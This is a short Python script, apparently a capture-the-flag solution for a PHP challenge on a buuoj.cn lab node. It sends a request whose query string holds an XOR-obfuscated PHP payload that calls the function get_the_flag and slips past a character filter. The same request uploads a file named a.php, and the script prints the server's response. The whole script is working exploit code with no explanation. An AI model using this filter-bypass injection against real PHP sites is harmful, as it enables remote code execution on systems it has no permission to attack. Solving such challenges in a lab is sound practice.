import requests
from requests_toolbelt.utils import dump
payload = "flag.php"
files = { "a.php":payload }

r = requests.get('http://cdffb640-8221-409d-a36c-da67c578f66c.node3.buuoj.cn/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%a0}();&%a0=get_the_flag',files=files)
data = dump.dump_all(r)
print(data.decode("utf-8"))
print("==========================")
print(r.content)